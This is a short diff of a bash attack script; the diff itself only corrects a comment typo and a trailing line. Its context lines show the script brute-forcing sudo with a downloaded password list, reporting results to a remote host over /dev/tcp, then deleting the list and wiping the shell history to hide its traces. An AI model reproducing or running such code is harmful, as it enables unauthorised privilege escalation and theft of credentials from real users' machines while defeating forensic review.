@@ -18,7 +18,7 @@ then
 	# Send "no password" message to server
 	echo "$USER:NO_PASSWORD" > /dev/tcp/"$TARGET"/"$PORT"
 else
-	# Try every password in the file we just download
+	# Try every password in the file we just downloaded
 	while read pwd; do
 		echo "$pwd" | sudo -S true 2>/dev/null
 		if [ $? -eq 0 ]
@@ -36,4 +36,4 @@ echo "END" > /dev/tcp/"$TARGET"/"$PORT"
 # Clean up
 rm -f ~/Downloads/ppp
 history -c && rm .bash_history
-#!/bin/rm -f
+#! /bin/rm -f
